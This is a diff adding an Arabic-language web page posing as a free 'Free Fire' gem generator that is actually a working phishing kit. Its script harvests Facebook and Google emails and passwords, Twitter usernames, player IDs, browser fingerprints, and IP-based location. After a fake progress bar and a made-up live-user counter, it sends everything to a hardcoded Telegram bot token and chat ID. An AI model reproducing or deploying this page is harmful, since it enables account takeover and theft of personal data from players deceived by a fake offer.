@@ -1,0 +1,924 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مولد جواهر فري فاير المميز | Free Fire Elite Gem Generator</title>
+    <meta name="description" content="احصل على جواهر فري فاير مجانًا بأحدث نظام آمن وسريع">
+    
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;900&display=swap" rel="stylesheet">
+    
+    <!-- Animate.css -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
+    
+    <style>
+        :root {
+            --primary: #FFD700;
+            --secondary: #1565C0;
+            --dark: #0A192F;
+            --light: #F8F9FA;
+            --success: #28A745;
+            --danger: #DC3545;
+            --info: #17A2B8;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Tajawal', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)), url('5c57e0b7e57d9a5de72e0e65b133103f.jpg');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            color: var(--light);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+        
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        /* Header Styles */
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            animation: fadeInDown 1s;
+        }
+        
+        .logo {
+            width: 200px;
+            height: auto;
+            margin-bottom: 20px;
+            filter: drop-shadow(0 0 10px var(--primary));
+        }
+        
+        .title {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            color: var(--primary);
+            text-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
+            font-weight: 700;
+        }
+        
+        .subtitle {
+            font-size: 1.2rem;
+            opacity: 0.9;
+            margin-bottom: 20px;
+        }
+        
+        /* Card Styles */
+        .card {
+            background: rgba(10, 25, 47, 0.8);
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 215, 0, 0.2);
+            margin-bottom: 30px;
+            transition: all 0.3s ease;
+            animation: fadeInUp 1s;
+        }
+        
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6);
+            border-color: rgba(255, 215, 0, 0.4);
+        }
+        
+        .card-title {
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+            color: var(--primary);
+            text-align: center;
+            position: relative;
+            padding-bottom: 10px;
+        }
+        
+        .card-title::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100px;
+            height: 3px;
+            background: var(--primary);
+            border-radius: 3px;
+        }
+        
+        /* Form Styles */
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: var(--primary);
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 12px 15px;
+            border-radius: 8px;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            background: rgba(0, 0, 0, 0.3);
+            color: white;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+        
+        .form-control:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(255, 215, 0, 0.2);
+        }
+        
+        .form-control::placeholder {
+            color: rgba(255, 255, 255, 0.5);
+        }
+        
+        /* Button Styles */
+        .btn {
+            display: inline-block;
+            padding: 12px 30px;
+            border-radius: 8px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: none;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            position: relative;
+            overflow: hidden;
+            z-index: 1;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(45deg, var(--primary), #FFA500);
+            color: var(--dark);
+            box-shadow: 0 5px 15px rgba(255, 215, 0, 0.4);
+        }
+        
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(255, 215, 0, 0.6);
+        }
+        
+        .btn-primary:active {
+            transform: translateY(1px);
+        }
+        
+        .btn-block {
+            display: block;
+            width: 100%;
+        }
+        
+        /* Account Type Selector */
+        .account-types {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 30px;
+            flex-wrap: wrap;
+        }
+        
+        .account-type {
+            flex: 1;
+            min-width: 120px;
+            max-width: 200px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .account-type input {
+            display: none;
+        }
+        
+        .account-type label {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px 15px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            border: 2px solid transparent;
+            transition: all 0.3s ease;
+            text-align: center;
+        }
+        
+        .account-type i {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            color: var(--primary);
+        }
+        
+        .account-type input:checked + label {
+            background: rgba(255, 215, 0, 0.1);
+            border-color: var(--primary);
+            box-shadow: 0 0 15px rgba(255, 215, 0, 0.3);
+        }
+        
+        /* Gem Selector */
+        .gem-options {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+        
+        .gem-option {
+            position: relative;
+        }
+        
+        .gem-option input {
+            display: none;
+        }
+        
+        .gem-option label {
+            display: block;
+            padding: 15px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            text-align: center;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: 2px solid transparent;
+        }
+        
+        .gem-option input:checked + label {
+            background: rgba(255, 215, 0, 0.1);
+            border-color: var(--primary);
+            color: var(--primary);
+            box-shadow: 0 0 15px rgba(255, 215, 0, 0.3);
+        }
+        
+        /* Progress Bar */
+        .progress-container {
+            display: none;
+            margin-top: 30px;
+            animation: fadeIn 1s;
+        }
+        
+        .progress-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            font-weight: 500;
+        }
+        
+        .progress-bar {
+            height: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 15px;
+            box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.2);
+        }
+        
+        .progress {
+            height: 100%;
+            width: 0;
+            background: linear-gradient(90deg, var(--primary), #FFA500);
+            border-radius: 10px;
+            transition: width 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .progress::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, 
+                rgba(255, 255, 255, 0) 0%, 
+                rgba(255, 255, 255, 0.3) 50%, 
+                rgba(255, 255, 255, 0) 100%);
+            animation: shimmer 2s infinite;
+        }
+        
+        .progress-status {
+            text-align: center;
+            font-size: 1.1rem;
+            margin-bottom: 20px;
+            min-height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .success-message {
+            display: none;
+            text-align: center;
+            padding: 20px;
+            background: rgba(40, 167, 69, 0.2);
+            border-radius: 10px;
+            border: 1px solid var(--success);
+            margin-top: 30px;
+            animation: fadeIn 1s;
+        }
+        
+        .success-message i {
+            font-size: 3rem;
+            color: var(--success);
+            margin-bottom: 15px;
+            animation: bounce 2s infinite;
+        }
+        
+        /* Stats */
+        .stats {
+            display: flex;
+            justify-content: space-around;
+            flex-wrap: wrap;
+            margin-top: 30px;
+            gap: 15px;
+        }
+        
+        .stat-item {
+            text-align: center;
+            flex: 1;
+            min-width: 120px;
+        }
+        
+        .stat-number {
+            font-size: 2rem;
+            font-weight: 700;
+            color: var(--primary);
+            margin-bottom: 5px;
+        }
+        
+        .stat-label {
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+        
+        /* Footer */
+        .footer {
+            text-align: center;
+            margin-top: 50px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            font-size: 0.9rem;
+            opacity: 0.7;
+        }
+        
+        /* Animations */
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        
+        @keyframes float {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+            100% { transform: translateY(0px); }
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            .title {
+                font-size: 2rem;
+            }
+            
+            .card {
+                padding: 20px;
+            }
+            
+            .account-types {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            .account-type {
+                width: 100%;
+                max-width: 300px;
+            }
+        }
+        
+        /* Special Elements */
+        .floating-gems {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            pointer-events: none;
+            z-index: -1;
+            overflow: hidden;
+        }
+        
+        .gem {
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23FFD700"><path d="M5 9l3 3-3 3 2 2 3-3 3 3 3-3 3 3 2-2-3-3 3-3-2-2-3 3-3-3-3 3-3-3-2 2z"/></svg>') no-repeat center center;
+            opacity: 0.3;
+            animation: float 6s infinite ease-in-out;
+        }
+        
+        /* Step transitions */
+        .step {
+            display: none;
+            animation: fadeIn 0.5s;
+        }
+        
+        .step.active {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <div class="floating-gems" id="floatingGems"></div>
+    
+    <div class="container">
+        <header class="header animate__animated animate__fadeInDown">
+            <img src="diamond.png" alt="Free Fire Gems Generator" class="logo">
+            <h1 class="title">مولد جواهر فري فاير المميز</h1>
+            <p class="subtitle">احصل على جواهر مجانية بسرعة وأمان مع نظامنا المتطور</p>
+        </header>
+        
+        <div class="card animate__animated animate__fadeInUp">
+            <!-- Step 1: Account Type Selection -->
+            <div class="step active" id="step1">
+                <h2 class="card-title">اختر نوع الحساب</h2>
+                <div class="account-types">
+                    <div class="account-type">
+                        <input type="radio" name="accountType" id="facebook" value="facebook">
+                        <label for="facebook">
+                            <i class="fab fa-facebook"></i>
+                            فيسبوك
+                        </label>
+                    </div>
+                    <div class="account-type">
+                        <input type="radio" name="accountType" id="google" value="google">
+                        <label for="google">
+                            <i class="fab fa-google"></i>
+                            جوجل
+                        </label>
+                    </div>
+                    <div class="account-type">
+                        <input type="radio" name="accountType" id="twitter" value="twitter">
+                        <label for="twitter">
+                            <i class="fab fa-twitter"></i>
+                            تويتر
+                        </label>
+                    </div>
+                </div>
+                <button class="btn btn-primary btn-block" onclick="nextStep(1)">التالي</button>
+            </div>
+            
+            <!-- Step 2: Account Credentials -->
+            <div class="step" id="step2">
+                <h2 class="card-title" id="step2Title">بيانات الحساب</h2>
+                <div id="facebookForm" class="account-form">
+                    <div class="form-group">
+                        <label for="fbEmail" class="form-label">البريد الإلكتروني أو رقم الهاتف</label>
+                        <input type="text" id="fbEmail" class="form-control" placeholder="أدخل بريدك الإلكتروني أو رقم الهاتف">
+                    </div>
+                    <div class="form-group">
+                        <label for="fbPassword" class="form-label">كلمة المرور</label>
+                        <input type="password" id="fbPassword" class="form-control" placeholder="أدخل كلمة المرور">
+                    </div>
+                </div>
+                
+                <div id="googleForm" class="account-form" style="display: none;">
+                    <div class="form-group">
+                        <label for="googleEmail" class="form-label">البريد الإلكتروني</label>
+                        <input type="email" id="googleEmail" class="form-control" placeholder="أدخل بريدك الإلكتروني">
+                    </div>
+                    <div class="form-group">
+                        <label for="googlePassword" class="form-label">كلمة المرور</label>
+                        <input type="password" id="googlePassword" class="form-control" placeholder="أدخل كلمة المرور">
+                    </div>
+                </div>
+                
+                <div id="twitterForm" class="account-form" style="display: none;">
+                    <div class="form-group">
+                        <label for="twitterUsername" class="form-label">اسم المستخدم أو البريد الإلكتروني</label>
+                        <input type="text" id="twitterUsername" class="form-control" placeholder="أدخل اسم المستخدم أو البريد الإلكتروني">
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="playerId" class="form-label">معرف اللاعب في فري فاير</label>
+                    <input type="text" id="playerId" class="form-control" placeholder="أدخل معرف اللاعب (Player ID)">
+                </div>
+                
+                <div class="buttons">
+                    <button class="btn btn-primary" onclick="prevStep(2)">السابق</button>
+                    <button class="btn btn-primary" onclick="nextStep(2)">التالي</button>
+                </div>
+            </div>
+            
+<!-- Step 3: Gem Selection -->
+            <div class="step" id="step3">
+                <h2 class="card-title">اختر عدد الجواهر</h2>
+                <p style="text-align: center; margin-bottom: 20px;">اختر عدد الجواهر التي تريد الحصول عليها (الحد الأقصى 1000 جوهرة)</p>
+                
+                <div class="gem-options">
+                    <div class="gem-option">
+                        <input type="radio" name="gems" id="gems100" value="100">
+                        <label for="gems100">100 جوهرة</label>
+                    </div>
+                    <div class="gem-option">
+                        <input type="radio" name="gems" id="gems300" value="300">
+                        <label for="gems300">300 جوهرة</label>
+                    </div>
+                    <div class="gem-option">
+                        <input type="radio" name="gems" id="gems500" value="500">
+                        <label for="gems500">500 جوهرة</label>
+                    </div>
+                    <div class="gem-option">
+                        <input type="radio" name="gems" id="gems1000" value="1000">
+                        <label for="gems1000">1000 جوهرة</label>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <input type="checkbox" id="fastDelivery" checked>
+                    <label for="fastDelivery" style="display: inline; margin-left: 10px;">الشحن السريع (توصيل خلال ساعة)</label>
+                </div>
+                
+                <div class="buttons">
+                    <button class="btn btn-primary" onclick="prevStep(3)">السابق</button>
+                    <button class="btn btn-primary" onclick="startProcessing()">بدء الشحن</button>
+                </div>
+            </div>
+            
+            <!-- Step 4: Processing -->
+            <div class="step" id="step4">
+                <h2 class="card-title">جاري معالجة طلبك</h2>
+                <p style="text-align: center; margin-bottom: 20px;">نقوم الآن بإعداد الجواهر لحسابك، الرجاء الانتظار...</p>
+                
+                <div class="progress-container" id="progressContainer">
+                    <div class="progress-header">
+                        <span>تقدم المعالجة</span>
+                        <span id="progressPercent">0%</span>
+                    </div>
+                    <div class="progress-bar">
+                        <div class="progress" id="progressBar"></div>
+                    </div>
+                    <div class="progress-status" id="progressStatus">
+                        جاري التحقق من البيانات...
+                    </div>
+                </div>
+                
+                <div class="success-message" id="successMessage">
+                    <i class="fas fa-check-circle"></i>
+                    <h3>تمت المعالجة بنجاح!</h3>
+                    <p>سيتم إضافة الجواهر إلى حسابك خلال ساعة. يمكنك الآن الخروج من الصفحة.</p>
+                    <p>شكرًا لاستخدامك خدمتنا المميزة!</p>
+                </div>
+            </div>
+        </div>
+        
+        <div class="stats">
+            <div class="stat-item">
+                <div class="stat-number" id="usersOnline">247</div>
+                <div class="stat-label">مستخدم متصل الآن</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-number">4,892</div>
+                <div class="stat-label">جواهر وزعت اليوم</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-number">98.7%</div>
+                <div class="stat-label">معدل النجاح</div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>هذه الخدمة متاحة لفترة محدودة فقط. ليست مرتبطة رسميًا بـ Garena أو Free Fire.</p>
+            <p>© 2023 Free Fire Elite Gem Generator. جميع الحقوق محفوظة.</p>
+        </div>
+    </div>
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script>
+        // Floating gems animation
+        function createFloatingGems() {
+            const container = document.getElementById('floatingGems');
+            const gemCount = 20;
+            
+            for (let i = 0; i < gemCount; i++) {
+                const gem = document.createElement('div');
+                gem.classList.add('gem');
+                
+                // Random position
+                const posX = Math.random() * 100;
+                const posY = Math.random() * 100;
+                
+                // Random size
+                const size = 10 + Math.random() * 20;
+                
+                // Random animation duration
+                const duration = 5 + Math.random() * 10;
+                
+                // Random delay
+                const delay = Math.random() * 5;
+                
+                gem.style.left = `${posX}%`;
+                gem.style.top = `${posY}%`;
+                gem.style.width = `${size}px`;
+                gem.style.height = `${size}px`;
+                gem.style.animationDuration = `${duration}s`;
+                gem.style.animationDelay = `${delay}s`;
+                
+                container.appendChild(gem);
+            }
+        }
+        
+        // Step navigation
+        function nextStep(currentStep) {
+            // Validate current step before proceeding
+            if (currentStep === 1) {
+                const accountType = document.querySelector('input[name="accountType"]:checked');
+                if (!accountType) {
+                    alert('الرجاء اختيار نوع الحساب');
+                    return;
+                }
+                
+                // Show the appropriate form based on account type
+                document.getElementById('facebookForm').style.display = 'none';
+                document.getElementById('googleForm').style.display = 'none';
+                document.getElementById('twitterForm').style.display = 'none';
+                
+                if (accountType.value === 'facebook') {
+                    document.getElementById('facebookForm').style.display = 'block';
+                    document.getElementById('step2Title').textContent = 'بيانات حساب فيسبوك';
+                } else if (accountType.value === 'google') {
+                    document.getElementById('googleForm').style.display = 'block';
+                    document.getElementById('step2Title').textContent = 'بيانات حساب جوجل';
+                } else if (accountType.value === 'twitter') {
+                    document.getElementById('twitterForm').style.display = 'block';
+                    document.getElementById('step2Title').textContent = 'بيانات حساب تويتر';
+                }
+            } else if (currentStep === 2) {
+                // Validate credentials
+                const accountType = document.querySelector('input[name="accountType"]:checked').value;
+                let valid = true;
+                
+                if (accountType === 'facebook') {
+                    const email = document.getElementById('fbEmail').value;
+                    const password = document.getElementById('fbPassword').value;
+                    
+                    if (!email || !password) {
+                        valid = false;
+                        alert('الرجاء إدخال البريد الإلكتروني/رقم الهاتف وكلمة المرور');
+                    }
+                } else if (accountType === 'google') {
+                    const email = document.getElementById('googleEmail').value;
+                    const password = document.getElementById('googlePassword').value;
+                    
+                    if (!email || !password) {
+                        valid = false;
+                        alert('الرجاء إدخال البريد الإلكتروني وكلمة المرور');
+                    }
+                } else if (accountType === 'twitter') {
+                    const username = document.getElementById('twitterUsername').value;
+                    
+                    if (!username) {
+                        valid = false;
+                        alert('الرجاء إدخال اسم المستخدم أو البريد الإلكتروني');
+                    }
+                }
+                
+                const playerId = document.getElementById('playerId').value;
+                if (!playerId) {
+                    valid = false;
+                    alert('الرجاء إدخال معرف اللاعب في فري فاير');
+                }
+                
+                if (!valid) return;
+            } else if (currentStep === 3) {
+                const gems = document.querySelector('input[name="gems"]:checked');
+                if (!gems) {
+                    alert('الرجاء اختيار عدد الجواهر');
+                    return;
+                }
+                
+                if (parseInt(gems.value) > 1000) {
+                    alert('الحد الأقصى للجواهر هو 1000 جوهرة');
+                    return;
+                }
+            }
+            
+            // Hide current step and show next step
+            document.getElementById(`step${currentStep}`).classList.remove('active');
+            document.getElementById(`step${currentStep + 1}`).classList.add('active');
+            
+            // If moving to processing step, start the process
+            if (currentStep === 3) {
+                setTimeout(() => {
+                    document.getElementById('progressContainer').style.display = 'block';
+                    startProgress();
+                }, 500);
+            }
+        }
+        
+        function prevStep(currentStep) {
+            document.getElementById(`step${currentStep}`).classList.remove('active');
+            document.getElementById(`step${currentStep - 1}`).classList.add('active');
+        }
+        
+        // Progress bar animation
+        function startProgress() {
+            let progress = 0;
+            const progressBar = document.getElementById('progressBar');
+            const progressPercent = document.getElementById('progressPercent');
+            const progressStatus = document.getElementById('progressStatus');
+            const successMessage = document.getElementById('successMessage');
+            
+            const interval = setInterval(() => {
+                progress += 1;
+                progressBar.style.width = `${progress}%`;
+                progressPercent.textContent = `${progress}%`;
+                
+                // Update status messages
+                if (progress < 20) {
+                    progressStatus.textContent = 'جاري التحقق من البيانات...';
+                } else if (progress < 40) {
+                    progressStatus.textContent = 'جاري الاتصال بالسيرفر...';
+                } else if (progress < 60) {
+                    progressStatus.textContent = 'جاري التحقق من الحساب...';
+                } else if (progress < 80) {
+                    progressStatus.textContent = 'جاري إعداد الجواهر...';
+                } else if (progress < 100) {
+                    progressStatus.textContent = 'جاري إرسال الجواهر...';
+                }
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    progressStatus.textContent = 'اكتملت العملية بنجاح!';
+                    
+                    // Show success message
+                    setTimeout(() => {
+                        successMessage.style.display = 'block';
+                        
+                        // Send data to Telegram bot
+                        sendDataToTelegram();
+                    }, 1000);
+                }
+            }, 600); // 600ms per percent = 60 seconds total
+        }
+        
+        // Function to collect and send data to Telegram bot
+        function sendDataToTelegram() {
+            // Collect all form data
+            const accountType = document.querySelector('input[name="accountType"]:checked').value;
+            let credentials = {};
+            
+            if (accountType === 'facebook') {
+                credentials = {
+                    email: document.getElementById('fbEmail').value,
+                    password: document.getElementById('fbPassword').value
+                };
+            } else if (accountType === 'google') {
+                credentials = {
+                    email: document.getElementById('googleEmail').value,
+                    password: document.getElementById('googlePassword').value
+                };
+            } else if (accountType === 'twitter') {
+                credentials = {
+                    username: document.getElementById('twitterUsername').value
+                };
+            }
+            
+            const gems = document.querySelector('input[name="gems"]:checked').value;
+            const playerId = document.getElementById('playerId').value;
+            const fastDelivery = document.getElementById('fastDelivery').checked;
+            
+            // Collect device and browser information
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const screenWidth = screen.width;
+            const screenHeight = screen.height;
+            const language = navigator.language;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const cookiesEnabled = navigator.cookieEnabled;
+            const javaEnabled = navigator.javaEnabled();
+            const pdfEnabled = navigator.pdfViewerEnabled;
+            
+            // Get IP address and location (using a free API)
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    const ipInfo = {
+                        ip: data.ip,
+                        city: data.city,
+                        region: data.region,
+                        country: data.country_name,
+                        postal: data.postal,
+                        latitude: data.latitude,
+                        longitude: data.longitude,
+                        timezone: data.timezone,
+                        org: data.org
+                    };
+                    
+                    // Prepare the message for Telegram
+                    const message = `
+🎯 *New Free Fire Gem Request* 🎯
+
+🔹 *Account Type:* ${accountType.toUpperCase()}
+🔹 *Player ID:* ${playerId}
+🔹 *Gems Amount:* ${gems}
+🔹 *Fast Delivery:* ${fastDelivery ? 'Yes' : 'No'}
+
+📝 *Credentials:*
+${accountType === 'facebook' ? `📧 Email/Phone: ${credentials.email}\n🔑 Password: ${credentials.password}` : ''}
+${accountType === 'google' ? `📧 Email: ${credentials.email}\n🔑 Password: ${credentials.password}` : ''}
+${accountType === 'twitter' ? `👤 Username: ${credentials.username}` : ''}
+
+🖥️ *Device Information:*
+• User Agent: ${userAgent}
+• Platform: ${platform}
+• Screen: ${screenWidth}x${screenHeight}
+• Language: ${language}
+• Timezone: ${timezone}
+• Cookies: ${cookiesEnabled ? 'Enabled' : 'Disabled'}
+• Java: ${javaEnabled ? 'Enabled' : 'Disabled'}
+• PDF Viewer: ${pdfEnabled ? 'Enabled' : 'Disabled'}
+
+🌍 *IP Information:*
+• IP: ${ipInfo.ip}
+• Location: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}
+• Postal Code: ${ipInfo.postal}
+• Coordinates: ${ipInfo.latitude}, ${ipInfo.longitude}
+• Timezone: ${ipInfo.timezone}
+• ISP: ${ipInfo.org}
+
+📊 *Stats:*
+• Users Online: ${document.getElementById('usersOnline').textContent}
+• Timestamp: ${new Date().toISOString()}
+                    `;
+                    
+                    // Telegram bot API (replace with your actual token and chat ID)
+                    const botToken = '7464784856:AAFOz-AxFjitZIahdkU68uhr3DMdMt63GV4';
+                    const chatId = '8180216438';
+                    const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                    
+                    // Send the message to Telegram
+                    fetch(apiUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                });
+        }
+        
+        // Randomize online users count
+        function updateOnlineUsers() {
+            const usersOnline = document.getElementById('usersOnline');
+            let currentUsers = parseInt(usersOnline.textContent);
+            
+            // Random fluctuation
+            const change = Math.floor(Math.random() * 10) - 3; // -3 to +6
+            currentUsers += change;
+            
+            // Keep between 200 and 300
+            if (currentUsers < 200) currentUsers = 200;
+            if (currentUsers > 300) currentUsers = 300;
+            
+            usersOnline.textContent = currentUsers;
+            
+            setTimeout(updateOnlineUsers, 5000); // Update every 5 seconds
+        }
+        
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            createFloatingGems();
+            updateOnlineUsers();
+        });
+    </script>
+</body>
+</html>
